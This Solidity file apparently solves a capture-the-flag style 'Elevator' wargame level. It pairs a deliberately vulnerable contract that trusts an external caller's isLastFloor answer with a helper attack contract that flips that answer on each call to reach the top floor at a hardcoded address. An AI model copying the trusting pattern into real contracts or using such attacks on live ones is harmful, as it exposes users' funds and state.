// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract BuildingHelper {
    uint32 public counter;

    function isLastFloor(uint256) external returns (bool) {
        ++counter;
        return (counter % 2) == 0;
    }

    function goTo(uint256 _floor) public {
        Elevator(0x3F95ba6c0Ae703A010451707F26AbCF34FF51621).goTo(_floor);
    }
}
